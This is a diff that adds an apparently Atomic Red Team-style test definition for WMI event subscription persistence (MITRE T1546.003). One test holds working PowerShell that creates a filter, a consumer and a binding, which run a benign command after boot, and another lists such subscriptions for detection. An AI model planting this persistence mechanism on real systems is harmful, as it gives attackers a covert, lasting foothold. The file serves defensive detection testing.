@@ -1,0 +1,46 @@
+attack_technique: T1546.003
+display_name: "Event Triggered Execution: WMI Event Subscription"
+tactic: Persistence
+atomic_tests:
+  - name: "Create WMI Event Subscription Persistence"
+    auto_generated_guid: e5e5f5a6b6c6d6e6f6a7b7c7d7e7f7a8
+    description: |
+      Creates a WMI event subscription for persistence.
+      The subscription triggers a command when a condition is met.
+    supported_platforms:
+      - windows
+    input_arguments:
+      sub_name:
+        description: "Subscription name"
+        type: string
+        default: "AtomicRedTeamWMI"
+    executor:
+      name: powershell
+      command: |
+        $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{Name="#{sub_name}_Filter"; EventNamespace="root/cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"}
+        $consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name="#{sub_name}_Consumer"; CommandLineTemplate="cmd.exe /c echo WMI Persistence > %TEMP%\wmi_persist.txt"}
+        Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}
+        Write-Output "WMI subscription created: #{sub_name}"
+      cleanup_command: |
+        Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name='#{sub_name}_Filter'" | Remove-WmiObject -ErrorAction SilentlyContinue
+        Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name='#{sub_name}_Consumer'" | Remove-WmiObject -ErrorAction SilentlyContinue
+        Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*#{sub_name}*" } | Remove-WmiObject -ErrorAction SilentlyContinue
+        Remove-Item $env:TEMP\wmi_persist.txt -Force -ErrorAction SilentlyContinue
+      elevation_required: true
+
+  - name: "Enumerate WMI Event Subscriptions"
+    auto_generated_guid: f6f6a7b7c7d7e7f7a8b8c8d8e8f8a9b9
+    description: |
+      Enumerates all WMI event subscriptions for persistence detection.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        Write-Output "--- Event Filters ---"
+        Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -ErrorAction SilentlyContinue | Select-Object Name,Query
+        Write-Output "`n--- Event Consumers ---"
+        Get-CimInstance -Namespace root/subscription -ClassName __EventConsumer -ErrorAction SilentlyContinue | Select-Object Name,__CLASS
+        Write-Output "`n--- Filter-Consumer Bindings ---"
+        Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue
+      elevation_required: true
